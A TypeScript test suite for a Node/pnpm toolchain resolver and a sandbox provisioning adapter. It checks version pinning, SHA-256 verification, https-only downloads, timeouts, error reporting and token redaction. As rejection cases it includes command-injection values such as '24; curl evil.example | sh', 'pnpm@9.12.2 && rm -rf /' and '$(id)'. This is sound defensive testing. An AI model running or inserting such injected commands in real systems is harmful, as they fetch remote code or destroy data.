import { execFile, execFileSync } from 'node:child_process';
import { chmod, mkdir, mkdtemp, readFile, realpath, rm, stat, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { promisify } from 'node:util';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { DEFAULT_TIMEOUTS, SbxRuntimeAdapter } from './adapter.ts';
import { FakeSbx, type FakeOptions } from './fake-sbx.ts';
import { NODE_MAJOR_PINS, NODE_TARBALL_SHA256, PATH_EXPORT, PROVISION_DEPS_SCRIPT, PROVISION_NODE_SCRIPT, PROVISION_PNPM_SCRIPT, resolveToolchain } from './toolchain.ts';

const execFileP = promisify(execFile);

let root: string;
beforeEach(async () => {
  root = await realpath(await mkdtemp(join(tmpdir(), 'toolchain-')));
});
afterEach(async () => {
  await rm(root, { recursive: true, force: true });
});

describe('resolveToolchain', () => {
  const repoWith = async (files: Readonly<Record<string, string>>) => {
    const repo = join(root, 'repo');
    await mkdir(repo, { recursive: true });
    execFileSync('git', ['init', '-q', repo]);
    for (const [p, b] of Object.entries({ 'README.md': 'x\n', ...files })) await writeFile(join(repo, p), b);
    const git = (...a: string[]) => execFileSync('git', ['-C', repo, '-c', 'user.email=t@t', '-c', 'user.name=t', ...a], { encoding: 'utf8' }).trim();
    git('add', '-A');
    git('commit', '-q', '-m', 'base');
    return { repo, sha: git('rev-parse', 'HEAD') };
  };
  const pkg = (pm: string) => JSON.stringify({ name: 'x', packageManager: pm });
  const NODE_PROJECT = { '.nvmrc': '24\n', 'package.json': pkg('pnpm@9.12.2'), 'pnpm-lock.yaml': 'lockfileVersion: 9\n' };

  it('turns a bare major into the pinned exact version, and reads pnpm from packageManager', async () => {
    const { repo, sha } = await repoWith(NODE_PROJECT);
    expect(await resolveToolchain(repo, sha)).toEqual({ kind: 'pinned', nodeVersion: NODE_MAJOR_PINS['24'], pnpmVersion: '9.12.2' });
    expect(NODE_MAJOR_PINS['24']).toMatch(/^24\.\d+\.\d+$/);
  });

  it('takes an exact .nvmrc as written, with or without the leading v, and ignores a corepack hash', async () => {
    const { repo, sha } = await repoWith({ ...NODE_PROJECT, '.nvmrc': 'v24.11.0\n', 'package.json': pkg('pnpm@9.12.2+sha512.abcDEF123') });
    expect(await resolveToolchain(repo, sha)).toEqual({ kind: 'pinned', nodeVersion: '24.11.0', pnpmVersion: '9.12.2' });
  });

  it('has both architectures\' published hashes for every pinned Node', () => {
    for (const version of Object.values(NODE_MAJOR_PINS)) {
      expect(NODE_TARBALL_SHA256[version]?.x64).toMatch(/^[0-9a-f]{64}$/);
      expect(NODE_TARBALL_SHA256[version]?.arm64).toMatch(/^[0-9a-f]{64}$/);
    }
  });

  it('a git that cannot start is not mistaken for a repository with no toolchain', async () => {
    const { repo, sha } = await repoWith(NODE_PROJECT);
    const path = process.env['PATH'];
    process.env['PATH'] = join(root, 'nowhere');
    try {
      expect(await resolveToolchain(repo, sha)).toMatchObject({ kind: 'read_failed', reason: expect.stringContaining('git') });
    } finally {
      process.env['PATH'] = path;
    }
  });

  it('is nothing to do for a repository that names no Node toolchain', async () => {
    const { repo, sha } = await repoWith({});
    expect(await resolveToolchain(repo, sha)).toEqual({ kind: 'none' });
  });

  it('reads the base commit, not whatever is checked out now', async () => {
    const { repo, sha } = await repoWith(NODE_PROJECT);
    await writeFile(join(repo, '.nvmrc'), 'lts/*\n');
    expect(await resolveToolchain(repo, sha)).toMatchObject({ kind: 'pinned' });
  });

  it.each([
    ['an alias .nvmrc', { ...NODE_PROJECT, '.nvmrc': 'lts/*\n' }, /\.nvmrc/],
    ['a shell-shaped .nvmrc', { ...NODE_PROJECT, '.nvmrc': '24; curl evil.example | sh\n' }, /\.nvmrc/],
    ['a major with no pin', { ...NODE_PROJECT, '.nvmrc': '22\n' }, /no pinned Node/],
    ['a missing .nvmrc', { 'package.json': pkg('pnpm@9.12.2'), 'pnpm-lock.yaml': 'x\n' }, /\.nvmrc/],
    ['a missing packageManager', { '.nvmrc': '24\n', 'package.json': '{}', 'pnpm-lock.yaml': 'x\n' }, /packageManager/],
    ['a package manager other than pnpm', { ...NODE_PROJECT, 'package.json': pkg('npm@10.0.0') }, /packageManager/],
    ['a pnpm range', { ...NODE_PROJECT, 'package.json': pkg('pnpm@^9') }, /packageManager/],
    ['an injection in packageManager', { ...NODE_PROJECT, 'package.json': pkg('pnpm@9.12.2 && rm -rf /') }, /packageManager/],
    ['unparseable package.json', { ...NODE_PROJECT, 'package.json': '{' }, /package\.json/],
    ['no lockfile', { '.nvmrc': '24\n', 'package.json': pkg('pnpm@9.12.2') }, /pnpm-lock\.yaml/],
  ])('refuses %s, naming the file at fault', async (_name, files, reason) => {
    const { repo, sha } = await repoWith(files);
    const r = await resolveToolchain(repo, sha);
    expect(r.kind).toBe('unresolved');
    if (r.kind === 'unresolved') expect(r.reason).toMatch(reason);
  });
});

describe('SbxRuntimeAdapter.provision', () => {
  const SPEC = { nodeVersion: '24.22.1', pnpmVersion: '9.12.2' };
  const make = async (opts: FakeOptions = {}) => {
    const sbx = new FakeSbx(opts);
    const ws = join(root, 'attempts', 'a1', 'workspace');
    await mkdir(ws, { recursive: true });
    const rt = new SbxRuntimeAdapter(sbx, { home: '/Users/nobody', forbidden: [], attemptsRoot: join(root, 'attempts'), timeouts: { signalMs: 50, graceMs: 60, stopMs: 80, lsMs: 50, createMs: 500, rmMs: 100 } });
    const handle = await rt.create({ attemptId: 'a1', taskId: 't1', workspacePath: ws, cpus: 2, memoryMiB: 4096 });
    return { sbx, rt, handle, ws };
  };
  const execs = (sbx: FakeSbx) => sbx.calls.filter((c) => c[0] === 'exec');

  it('installs Node, then pnpm, then the dependencies, each through sbx exec with the versions as arguments, never interpolated', async () => {
    const { sbx, rt, handle, ws } = await make();
    const r = await rt.provision(handle, SPEC);
    expect(r).toMatchObject({ ok: true, arch: 'arm64', nodeVersion: '24.22.1', pnpmVersion: '9.12.2' });
    const [node, pnpm, deps, ...rest] = execs(sbx);
    expect(rest).toEqual([]);
    const pinned = NODE_TARBALL_SHA256['24.22.1']!;
    expect(node).toEqual(['exec', handle.sandboxId, 'sh', '-c', PROVISION_NODE_SCRIPT, 'sh', '24.22.1', pinned.x64, pinned.arm64]);
    expect(pnpm).toEqual(['exec', handle.sandboxId, 'sh', '-c', PROVISION_PNPM_SCRIPT, 'sh', '24.22.1', '9.12.2']);
    expect(deps).toEqual(['exec', '-w', ws, handle.sandboxId, 'sh', '-c', PROVISION_DEPS_SCRIPT]);
    for (const script of [PROVISION_NODE_SCRIPT, PROVISION_PNPM_SCRIPT, PROVISION_DEPS_SCRIPT]) expect(script).not.toMatch(/24\.22\.1|9\.12\.2/);
    expect(PROVISION_DEPS_SCRIPT).toContain('CI=1 pnpm install --frozen-lockfile');
  });

  it('never leaves the sandbox: nothing but the sandbox it was given is exec-ed', async () => {
    const { sbx, rt, handle } = await make();
    sbx.addForeign('hq-askwell-jim');
    await rt.provision(handle, SPEC);
    expect(sbx.calls.flat()).not.toContain('hq-askwell-jim');
  });

  it.each([
    ['a tampered Node version', { nodeVersion: '24.22.1; rm -rf /', pnpmVersion: '9.12.2' }],
    ['a tampered pnpm version', { nodeVersion: '24.22.1', pnpmVersion: '$(id)' }],
    ['a partial version', { nodeVersion: '24', pnpmVersion: '9.12.2' }],
  ])('refuses %s before running anything', async (_n, spec) => {
    const { sbx, rt, handle } = await make();
    expect(await rt.provision(handle, spec)).toMatchObject({ ok: false, reason: expect.stringContaining('invalid toolchain version') });
    expect(execs(sbx)).toEqual([]);
  });

  it.each([
    ['node', 64, /unsupported sandbox architecture/],
    ['node', 65, /could not download Node 24\.22\.1 from nodejs\.org/],
    ['node', 66, /SHA-256 check/],
    ['node', 67, /could not unpack Node 24\.22\.1/],
    ['pnpm', 70, /could not install pnpm 9\.12\.2/],
    ['pnpm', 71, /did not report the pinned versions/],
    ['deps', 1, /pnpm install --frozen-lockfile failed \(exit 1\)/],
  ] as const)('%s exiting %i is a readable failure and stops the sequence there', async (step, code, reason) => {
    const { sbx, rt, handle } = await make({ provision: (s) => (s === step ? { code, stdout: '', stderr: 'boom', timedOut: false } : undefined) });
    const r = await rt.provision(handle, SPEC);
    expect(r).toMatchObject({ ok: false, reason: expect.stringMatching(reason) });
    expect(execs(sbx)).toHaveLength(['node', 'pnpm', 'deps'].indexOf(step) + 1);
  });

  it('a timed-out step says which one, and each step is bounded', async () => {
    const seen: Array<number | undefined> = [];
    const { rt, handle } = await make({ provision: (s, _a, o) => { seen.push(o.timeoutMs); return s === 'deps' ? { code: null, stdout: '', stderr: '', timedOut: true } : undefined; } });
    const r = await rt.provision(handle, SPEC);
    expect(r).toMatchObject({ ok: false, reason: expect.stringMatching(/pnpm install --frozen-lockfile timed out/) });
    expect(seen).toHaveLength(3);
    for (const t of seen) expect(t).toBeGreaterThan(0);
  });

  it('the attempt-wide budget caps every step', async () => {
    const seen: Array<number | undefined> = [];
    const { rt, handle } = await make({ provision: (_s, _a, o) => { seen.push(o.timeoutMs); return undefined; } });
    await rt.provision(handle, SPEC, { timeoutMs: 1234 });
    expect(seen.length).toBe(3);
    for (const t of seen) expect(t).toBeLessThanOrEqual(1234);
  });

  it('an abort stops the sequence and reports it was stopped, not a toolchain fault', async () => {
    const controller = new AbortController();
    const { sbx, rt, handle } = await make({ provision: (s) => { if (s === 'pnpm') controller.abort(); return undefined; } });
    const r = await rt.provision(handle, SPEC, { signal: controller.signal });
    expect(r).toMatchObject({ ok: false, reason: expect.stringContaining('stopped') });
    expect(execs(sbx)).toHaveLength(2);
  });

  it('a version with no compiled-in hash passes empty ones, leaving the published list as the check', async () => {
    const { sbx, rt, handle } = await make();
    await rt.provision(handle, { nodeVersion: '24.11.0', pnpmVersion: '9.12.2' });
    expect(execs(sbx)[0]!.slice(-3)).toEqual(['24.11.0', '', '']);
  });

  it('pnpm reporting its error on stdout with an empty stderr still says what went wrong', async () => {
    const stdout = [
      'Lockfile is up to date, resolution step is skipped',
      '\u001b[31m ERR_PNPM_OUTDATED_LOCKFILE\u001b[39m  Cannot install with "frozen-lockfile" because pnpm-lock.yaml is not up to date with package.json',
      '',
      'Note that in CI environments this setting is true by default.',
      `  Failure reason: ${'specifiers differ '.repeat(200)}`,
    ].join('\n');
    const { rt, handle } = await make({ provision: (s) => (s === 'deps' ? { code: 1, stdout, stderr: '', timedOut: false } : undefined) });
    const r = await rt.provision(handle, SPEC);
    if (r.ok) throw new Error('unexpected');
    expect(r.reason).toMatch(/pnpm install --frozen-lockfile failed \(exit 1\): ERR_PNPM_OUTDATED_LOCKFILE/);
    expect(r.reason.length).toBeLessThanOrEqual(260);
    expect(r.reason).not.toContain('\u001b');
    expect(r.detail).toContain('ERR_PNPM_OUTDATED_LOCKFILE');
    expect(r.detail).toContain('specifiers differ');
  });

  it.each(['node', 'pnpm', 'deps'] as const)('%s falls back to stdout when stderr is only whitespace', async (step) => {
    const { rt, handle } = await make({ provision: (s) => (s === step ? { code: 9, stdout: 'first\nthe real cause\n', stderr: ' \n', timedOut: false } : undefined) });
    const r = await rt.provision(handle, SPEC);
    if (r.ok) throw new Error('unexpected');
    expect(r.reason).toContain('the real cause');
    expect(r.detail).toContain('the real cause');
  });

  it('with no line naming an error, the last stderr line is the cause', async () => {
    const { rt, handle } = await make({ provision: (s) => (s === 'pnpm' ? { code: 70, stdout: 'from stdout', stderr: 'from stderr', timedOut: false } : undefined) });
    const r = await rt.provision(handle, SPEC);
    if (r.ok) throw new Error('unexpected');
    expect(r.reason).toContain('from stderr');
  });

  it('an error line on stdout wins over stderr that holds only warnings, and the detail keeps both', async () => {
    const stdout = 'Progress: resolved 200\n ERR_PNPM_OUTDATED_LOCKFILE  Cannot install with "frozen-lockfile"\nNote that in CI this is the default.';
    const stderr = ' WARN  deprecated inflight@1.0.6\n WARN  1 deprecated subdependencies found';
    const { rt, handle } = await make({ provision: (s) => (s === 'deps' ? { code: 1, stdout, stderr, timedOut: false } : undefined) });
    const r = await rt.provision(handle, SPEC);
    if (r.ok) throw new Error('unexpected');
    expect(r.reason).toMatch(/failed \(exit 1\): ERR_PNPM_OUTDATED_LOCKFILE/);
    expect(r.detail).toContain('ERR_PNPM_OUTDATED_LOCKFILE');
    expect(r.detail).toContain('deprecated subdependencies');
  });

  it('an error line on stderr still wins over one on stdout', async () => {
    const { rt, handle } = await make({ provision: (s) => (s === 'pnpm' ? { code: 70, stdout: 'error: from stdout', stderr: 'npm error code E404', timedOut: false } : undefined) });
    const r = await rt.provision(handle, SPEC);
    if (r.ok) throw new Error('unexpected');
    expect(r.reason).toContain('npm error code E404');
  });

  it('a secret on stdout is redacted out of both the reason and the detail', async () => {
    const token = 'ghp_012345678901234567890123456789012345';
    const { rt, handle } = await make({ provision: (s) => (s === 'deps' ? { code: 1, stdout: `error: fetch failed with ${token}`, stderr: '', timedOut: false } : undefined) });
    const r = await rt.provision(handle, SPEC);
    if (r.ok) throw new Error('unexpected');
    expect(r.reason).not.toContain(token);
    expect(r.detail).not.toContain(token);
  });

  it('stderr is redacted into both the detail and the reason', async () => {
    const leak = 'npm ERR! https://user:ghp_012345678901234567890123456789012345@registry.example/ failed';
    const { rt, handle } = await make({ provision: (s) => (s === 'pnpm' ? { code: 70, stdout: '', stderr: leak, timedOut: false } : undefined) });
    const r = await rt.provision(handle, SPEC);
    expect(r).toMatchObject({ ok: false });
    if (r.ok) throw new Error('unexpected');
    expect(r.reason).not.toContain('ghp_012345678901234567890123456789012345');
    expect(r.detail).not.toContain('ghp_012345678901234567890123456789012345');
  });

  it('a runner error while executing is a failed step, not a throw', async () => {
    const { rt, handle } = await make({ provision: (s) => { if (s === 'node') throw new Error('sbx vanished'); return undefined; } });
    await expect(rt.provision(handle, SPEC)).resolves.toMatchObject({ ok: false, reason: expect.stringContaining('Node') });
  });

  it('the harness starts with the toolchain first on PATH once provisioned, and not before', async () => {
    const { sbx, rt, handle } = await make();
    const task = { attemptId: 'a1', command: ['claude', '-p', 'x'], cwd: '/w', timeoutSeconds: 60 };
    await rt.start(handle, task);
    expect(sbx.streams[0]!.args[6]).not.toContain(PATH_EXPORT);
    await rt.provision(handle, SPEC);
    await rt.start(handle, task);
    const wrapper = sbx.streams[1]!.args[6]!;
    expect(wrapper.startsWith(PATH_EXPORT)).toBe(true);
    expect(wrapper).toContain('exec timeout');
  });

  it('a failed provision does not put the toolchain on PATH', async () => {
    const { sbx, rt, handle } = await make({ provision: () => ({ code: 65, stdout: '', stderr: '', timedOut: false }) });
    await rt.provision(handle, SPEC);
    await rt.start(handle, { attemptId: 'a1', command: ['claude'], cwd: '/w' });
    expect(sbx.streams[0]!.args[6]).not.toContain(PATH_EXPORT);
  });
});

describe('the guest scripts, in a real shell with stub tools', () => {
  const sh = (script: string, args: readonly string[], env: Record<string, string>) =>
    execFileP('sh', ['-c', script, 'sh', ...args], { env, encoding: 'utf8' }).then(
      (r) => ({ code: 0, stdout: r.stdout, stderr: r.stderr }),
      (e: { code: number; stdout: string; stderr: string }) => ({ code: e.code, stdout: e.stdout, stderr: e.stderr }),
    );
  const VERSION = '24.22.1';
  const TARBALL = `node-v${VERSION}-linux-arm64.tar.gz`;

  /** A bin directory of stubs: `curl` serves files from `served`, `tar` drops a marker, `uname` reports aarch64. */
  const stubs = async (opts: { sums: string; curlFails?: boolean }) => {
    const home = join(root, 'home');
    const bin = join(root, 'bin');
    const served = join(root, 'served');
    await mkdir(home, { recursive: true });
    await mkdir(bin, { recursive: true });
    await mkdir(served, { recursive: true });
    await writeFile(join(served, TARBALL), 'tarball-bytes');
    await writeFile(join(served, 'SHASUMS256.txt'), opts.sums);
    const script = async (name: string, body: string) => {
      await writeFile(join(bin, name), `#!/bin/sh\n${body}\n`);
      await chmod(join(bin, name), 0o755);
    };
    await script('uname', 'echo aarch64');
    await script('curl', opts.curlFails ? 'exit 22' : `
out=""; url=""
while [ $# -gt 0 ]; do case "$1" in -o) out="$2"; shift 2;; -*) case "$1" in --connect-timeout|--max-time|--retry|--retry-delay|--proto|--proto-redir) shift 2;; *) shift;; esac;; *) url="$1"; shift;; esac; done
cp "${served}/$(basename "$url")" "$out"`);
    await script('tar', `touch "${root}/unpacked"; mkdir -p "${home}/.node/bin"`);
    return { home, env: { HOME: home, PATH: `${bin}:/usr/bin:/bin:/sbin` } };
  };
  const hash = () => execFileSync('sh', ['-c', 'printf %s tarball-bytes | shasum -a 256'], { encoding: 'utf8' }).split(' ')[0]!;
  const unpacked = () => stat(join(root, 'unpacked')).then(() => true, () => false);
  const sums = (h: string) => `${'0'.repeat(64)}  node-v${VERSION}-linux-x64.tar.gz\n${h}  ${TARBALL}\n`;

  it('unpacks a tarball whose hash matches, and prints the guest architecture', async () => {
    const { env } = await stubs({ sums: sums(hash()) });
    const r = await sh(PROVISION_NODE_SCRIPT, [VERSION], env);
    expect(r).toMatchObject({ code: 0 });
    expect(r.stdout.trim()).toBe('arm64');
    expect(await unpacked()).toBe(true);
  });

  it('exits 66 and unpacks nothing when the hash differs', async () => {
    const { env, home } = await stubs({ sums: sums('f'.repeat(64)) });
    const r = await sh(PROVISION_NODE_SCRIPT, [VERSION], env);
    expect(r.code).toBe(66);
    expect(await unpacked()).toBe(false);
    expect(await stat(join(home, '.node')).then(() => true, () => false)).toBe(false);
  });

  it('exits 66 and unpacks nothing when the published list agrees with the tarball but the compiled-in hash does not', async () => {
    const { env } = await stubs({ sums: sums(hash()) });
    const r = await sh(PROVISION_NODE_SCRIPT, [VERSION, '1'.repeat(64), 'e'.repeat(64)], env);
    expect(r.code).toBe(66);
    expect(await unpacked()).toBe(false);
  });

  it('unpacks when the compiled-in hash for this architecture matches too', async () => {
    const { env } = await stubs({ sums: sums(hash()) });
    expect((await sh(PROVISION_NODE_SCRIPT, [VERSION, '1'.repeat(64), hash()], env)).code).toBe(0);
    expect(await unpacked()).toBe(true);
  });

  it('only ever fetches over https, redirects included, and its retries fit inside the step limit', () => {
    const calls = PROVISION_NODE_SCRIPT.split('\n').filter((l) => l.startsWith('curl '));
    expect(calls).toHaveLength(2);
    let worst = 0;
    for (const c of calls) {
      expect(c).toContain("--proto '=https'");
      expect(c).toContain("--proto-redir '=https'");
      const n = (flag: string) => Number(new RegExp(`${flag} (\\d+)`).exec(c)?.[1]);
      const retries = n('--retry');
      expect(retries).toBeGreaterThan(0);
      worst += (retries + 1) * n('--max-time') + retries * n('--retry-delay');
    }
    expect(worst).toBeLessThan(DEFAULT_TIMEOUTS.provisionNodeMs / 1000);
  });

  it('a slow link (150 KB/s) still fetches the tarball in one try, and both tries fit the step', () => {
    // node-v24.22.1-linux-x64.tar.gz, the larger of the two, is 58,290,700 bytes (Content-Length on nodejs.org, 2026-11-10).
    const TARBALL_BYTES = 58_290_700;
    const tarball = PROVISION_NODE_SCRIPT.split('\n').find((l) => l.startsWith('curl ') && l.includes('$f"'))!;
    const maxTime = Number(/--max-time (\d+)/.exec(tarball)![1]);
    expect(maxTime - 15).toBeGreaterThan(TARBALL_BYTES / 150_000);
    expect(Number(/--retry (\d+)/.exec(tarball)![1])).toBe(1);
    expect(2 * maxTime + 3).toBeLessThan(DEFAULT_TIMEOUTS.provisionNodeMs / 1000);
  });

  it('exits 66 when SHASUMS256.txt has no line for this tarball', async () => {
    const { env } = await stubs({ sums: `${'0'.repeat(64)}  other.tar.gz\n` });
    expect((await sh(PROVISION_NODE_SCRIPT, [VERSION], env)).code).toBe(66);
    expect(await unpacked()).toBe(false);
  });

  it('exits 65 when the download fails', async () => {
    const { env } = await stubs({ sums: sums(hash()), curlFails: true });
    expect((await sh(PROVISION_NODE_SCRIPT, [VERSION], env)).code).toBe(65);
    expect(await unpacked()).toBe(false);
  });

  it('adds the toolchain to login shells, once, however often it runs', async () => {
    const { env, home } = await stubs({ sums: sums(hash()) });
    await sh(PROVISION_NODE_SCRIPT, [VERSION], env);
    await sh(PROVISION_NODE_SCRIPT, [VERSION], env);
    const profile = await readFile(join(home, '.profile'), 'utf8');
    expect(profile.split(PATH_EXPORT).length - 1).toBe(1);
  });

  it('the launch wrapper really puts the toolchain on PATH for the process and everything it spawns', async () => {
    const home = join(root, 'home');
    const nodeBin = join(home, '.node', 'bin');
    await mkdir(nodeBin, { recursive: true });
    await writeFile(join(nodeBin, 'node'), '#!/bin/sh\necho node-from-toolchain\n');
    await chmod(join(nodeBin, 'node'), 0o755);
    const wrapper = `${PATH_EXPORT} exec "$@"`;
    // Stands in for claude, then for its Bash tool: a child shell that runs `node`.
    const r = await sh(wrapper, ['sh', '-c', 'echo "$PATH"; sh -c "node"'], { HOME: home, PATH: '/usr/bin:/bin' });
    expect(r.code).toBe(0);
    const [path, viaChild] = r.stdout.trim().split('\n');
    expect(path!.split(':')[0]).toBe(nodeBin);
    expect(viaChild).toBe('node-from-toolchain');
  });
});
